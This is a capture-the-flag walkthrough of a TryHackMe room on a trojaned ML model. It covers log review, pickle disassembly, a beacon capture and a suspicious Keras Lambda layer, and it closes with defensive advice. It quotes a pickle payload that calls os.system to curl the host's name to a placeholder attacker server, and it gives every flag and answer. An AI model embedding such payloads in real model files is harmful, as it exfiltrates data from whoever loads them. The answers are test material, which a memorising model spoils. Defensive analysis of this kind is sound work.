# AI Supply Chain Security — Payload

**Platform:** TryHackMe  
**Module:** AI Supply Chain Security  
**Room:** Payload  

---

## 🧠 Room Summary

A SOC alert fired at 03:14. No deployments were scheduled. No changes were logged. The ML inference server had been making outbound HTTPS connections to an unrecognised address for **21 days** before detection.

This room simulates a real-world **AI supply chain attack** where a threat actor replaced a legitimate ML model with a trojaned version containing a hidden payload. As the analyst, you investigate the incident by examining deployment logs, decompiling the malicious model, analysing a network beacon capture, and inspecting a staged candidate model.

---

## 🗂️ Incident Directory Structure

```
/opt/supply-chain/incident/
├── logs/
│   ├── deployment.log       # When and where models were deployed
│   └── beacon_capture.log   # Network capture of outbound HTTPS call
├── models/
│   ├── original_model.pkl   # Original legitimate model
│   ├── production_model.pkl # Trojaned model currently running
│   └── candidate_model.h5   # Staged replacement (not yet deployed)
└── checksums/               # SHA256 hashes for comparison
```

**Tools available:**
`pickletools` · `fickling` · `modelscan` · `sha256sum` · `inspect_h5_model.py`

---

## 📋 Task 1 — The Incident

### Q1 — What is the name of the organisation the replacement model came from?

**Command used:**
```bash
cat /opt/supply-chain/incident/logs/deployment.log
```

**What this command does:**  
`cat` (concatenate) reads and prints the full contents of a file to the terminal. Here we use it to read the deployment log, which records every model pull, load, and deployment event with timestamps and source URLs.

**Relevant log output:**
```
[2024-01-05 09:15:23] INFO  Source: huggingface.co/verified-ml-team/code-review-bert
[2024-01-26 14:32:12] INFO  Source: huggingface.co/trustworthy-ai-lab/code-review-bert-v2
[2024-01-26 14:32:14] WARN  New source organisation detected: trustworthy-ai-lab
```

The original model came from `verified-ml-team`. The replacement came from a **different organisation** — flagged with a WARN in the log.

**Answer:** `trustworthy-ai-lab`

---

### Q2 — How many days passed between the replacement model being deployed and the SOC alert firing?

**Command used:**
```bash
cat /opt/supply-chain/incident/logs/deployment.log
```

Same command as Q1 — we extract the two key dates from the log:

| Event | Date |
|---|---|
| Replacement model deployed | 2024-01-26 |
| SOC alert fired | 2024-02-16 |

**Calculation:**  
January has 31 days → 31 - 26 = 5 days remaining in January  
February 1–16 = 16 days  
**5 + 16 = 21 days**

The payload ran silently for nearly three weeks before the automated detection rule triggered.

**Answer:** `21`

---

### Q3 — What Python function does the payload use to execute the shell command?

**Command used:**
```bash
python3 -c "import pickletools; pickletools.dis(open('/opt/supply-chain/incident/models/production_model.pkl','rb'))"
```

**What this command does:**  
This decompiles a Python pickle file and prints its opcodes (low-level instructions).

Breaking it down:

| Part | Meaning |
|---|---|
| `python3 -c "..."` | Run Python code directly from the terminal without creating a script file |
| `import pickletools` | Load Python's built-in pickle inspection library |
| `pickletools.dis(...)` | Disassemble (decompile) a pickle file — shows every opcode |
| `open(..., 'rb')` | Open the file in read-binary mode (pickle files are binary) |

**Why pickle is dangerous:**  
Pickle is Python's serialisation format — it converts Python objects to bytes for storage or transfer. The problem is that pickle files can contain **executable code** that runs automatically when the file is loaded. An attacker can embed malicious instructions directly inside a model saved as pickle.

**Relevant output:**
```
11: \x8c SHORT_BINUNICODE 'os'
16: \x8c SHORT_BINUNICODE 'system'
25: \x93 STACK_GLOBAL
27: \x8c SHORT_BINUNICODE 'curl "http://attacker.com/beacon" -d "host=$(hostname)"'
87: R  REDUCE
```

The opcodes show the pickle loading `os.system` — Python's standard library function for running shell commands.

**Answer:** `os.system`

---

### Q4 — What shell command does the payload use to capture the host's identity?

**Command used:** Same decompile command as Q3.

**Relevant output:**
```
27: \x8c SHORT_BINUNICODE 'curl "http://attacker.com/beacon" -d "host=$(hostname)"'
```

**Breaking down the shell command:**

| Part | Meaning |
|---|---|
| `curl` | Command-line tool for making HTTP requests |
| `"http://attacker.com/beacon"` | The attacker's server endpoint receiving the data |
| `-d "host=$(hostname)"` | Sends POST data; `$(hostname)` runs the `hostname` command and substitutes the result |
| `$(hostname)` | Shell subshell — captures the machine's hostname to identify the compromised host |

When this command runs, it sends the machine's hostname to the attacker's server — allowing them to know exactly which host they've compromised.

**Answer:** `curl "http://attacker.com/beacon" -d "host=$(hostname)"`

---

### Q5 — The beacon capture log shows the HTTP method used in the outbound request. What is it?

**Command used:**
```bash
cat /opt/supply-chain/incident/logs/beacon_capture.log
```

**What this command does:**  
Reads the network beacon capture log — a record of the outbound HTTPS connection that was detected and blocked by the SOC rule.

**Relevant output:**
```
[2024-02-16 03:13:47] SESSION beacon-4821 ESTABLISHED  src=10.0.1.50  dst=attacker.com:443
[2024-02-16 03:13:47] REQUEST POST /beacon HTTP/1.1
[2024-02-16 03:13:47] HOST attacker.com
[2024-02-16 03:13:47] PAYLOAD host=ml-server-prod-01&id=THM{b4ckd00r_1n_
[2024-02-16 03:13:48] SESSION beacon-4821 BLOCKED  bytes_captured=51  reason=SOC_RULE_4821
```

The `REQUEST` line shows `POST` — the HTTP method used to send the hostname data to the attacker's server. Also notice the PAYLOAD line contains the **first half of the flag**, cut off when the session was blocked.

**Answer:** `POST`

---

### Q6 — Run `inspect_h5_model.py` against the candidate model. What is the name of the suspicious layer it contains?

**Finding the script first:**
```bash
find / -name "inspect_h5_model.py" 2>/dev/null
```

**What this command does:**

| Part | Meaning |
|---|---|
| `find /` | Search from the root directory recursively |
| `-name "inspect_h5_model.py"` | Look for a file with this exact name |
| `2>/dev/null` | Redirect error messages (permission denied etc.) to /dev/null so they don't clutter the output |

**Result:** Script found at `/opt/supply-chain/tools/inspect_h5_model.py`

**Command used:**
```bash
python3 /opt/supply-chain/tools/inspect_h5_model.py /opt/supply-chain/incident/models/candidate_model.h5
```

**What this command does:**  
Runs a custom inspection script against a Keras/TensorFlow `.h5` model file. It iterates through every layer in the model architecture and flags anything suspicious.

**Output:**
```
=== Architecture Inspection: candidate_model.h5 ===

Total layers: 5

[OK]      InputLayer    input_layer_2
[OK]      Flatten       flatten_2
[OK]      Dense         dense_4
[OK]      Dense         dense_5
[WARNING] Lambda        manipulate_output (function: manipulate_output)
          exfil_suffix: pl41n_s1ght}

RESULT: 1 layer(s) require review
  - Lambda (manipulate_output): Can contain arbitrary Python code that executes at inference time
```

**Why Lambda layers are dangerous:**  
A `Lambda` layer in Keras allows embedding arbitrary Python code directly inside a model. When the model runs inference (makes predictions), the Lambda layer executes its code — making it a perfect hiding spot for a payload. Normal neural network layers (`Dense`, `Flatten`, `Conv2D`) only perform mathematical operations. A `Lambda` layer named `manipulate_output` is a clear red flag.

**Answer:** `manipulate_output`

---

### Q7 — The attacker split the campaign ID across two artefacts. Recover the complete flag.

**What "split across two artefacts" means:**  
The attacker deliberately split the flag/campaign ID so that no single log or file would reveal it completely. This is an **evasion technique** — if the beacon was captured, analysts would only see half the ID. The other half was hidden inside the candidate model's metadata.

**Artefact 1 — beacon_capture.log:**
```
PAYLOAD host=ml-server-prod-01&id=THM{b4ckd00r_1n_
```
First half: `THM{b4ckd00r_1n_`

**Artefact 2 — candidate_model.h5:**
```
exfil_suffix: pl41n_s1ght}
```
Second half: `pl41n_s1ght}`

**Combining both parts:**
```
THM{b4ckd00r_1n_pl41n_s1ght}
```

**Decoding the leet speak:**
- `b4ckd00r` = backdoor
- `1n` = in
- `pl41n` = plain (`4` = a, `1` = i)
- `s1ght` = sight (`1` = i)

**Full phrase: "Backdoor in plain sight"** — the attacker literally hid a backdoor in plain sight.

**Answer:** `THM{b4ckd00r_1n_pl41n_s1ght}`

---

## ✅ All Answers

| # | Question | Answer |
|---|---|---|
| Q1 | Organisation the replacement model came from | `trustworthy-ai-lab` |
| Q2 | Days between deployment and SOC alert | `21` |
| Q3 | Python function used to execute shell command | `os.system` |
| Q4 | Shell command used to capture host identity | `curl "http://attacker.com/beacon" -d "host=$(hostname)"` |
| Q5 | HTTP method in the outbound request | `POST` |
| Q6 | Suspicious layer name in candidate model | `manipulate_output` |
| Q7 | Complete flag | `THM{b4ckd00r_1n_pl41n_s1ght}` |

---

## 🔑 Key Concepts & Lessons

### 1. Pickle Deserialisation Attacks
Python's pickle format is inherently unsafe — it can execute arbitrary code on load. **Never load untrusted pickle files.** Always scan models with tools like `fickling` or `modelscan` before deployment.

### 2. H5 Model Lambda Layer Abuse
Keras Lambda layers allow arbitrary Python code inside a model architecture. A legitimate model should never contain Lambda layers in production — they're a red flag during model review.

### 3. AI Supply Chain Substitution
The attacker didn't hack the server directly — they replaced the model at the **source** (HuggingFace). The infrastructure pulled a trojaned model thinking it was a legitimate update. This is a classic supply chain attack applied to ML.

### 4. Beaconing & Exfiltration
The payload used `curl` with `$(hostname)` to beacon home — a simple but effective technique. It ran for **21 days** undetected, showing how long backdoors can persist without proper model integrity checks.

### 5. Split Campaign ID Evasion
Splitting the campaign ID across two artefacts (network + model) means partial captures don't reveal the full identifier. A complete investigation requires correlating **multiple data sources**.

### 6. MITRE ATLAS Techniques

| Technique | ID | Description |
|---|---|---|
| ML Supply Chain Compromise | AML.T0010 | Substituting a legitimate model with a trojaned version |
| Publish Poisoned Model | AML.T0053 | Uploading malicious model to public registry |
| Exfiltration via ML Inference | AML.T0040 | Using inference time to beacon out |

---

## 🛡️ Defensive Recommendations

- **Pin model versions** with SHA256 hashes and verify on every pull
- **Scan all models** with `modelscan` or `fickling` before deployment
- **Restrict outbound traffic** from ML inference servers — they should never initiate HTTPS connections
- **Review model architecture** for unexpected layer types (Lambda, Custom) before deployment
- **Monitor HuggingFace sources** — flag new organisations in deployment pipelines
- **Implement model signing** so only verified models can be deployed

---
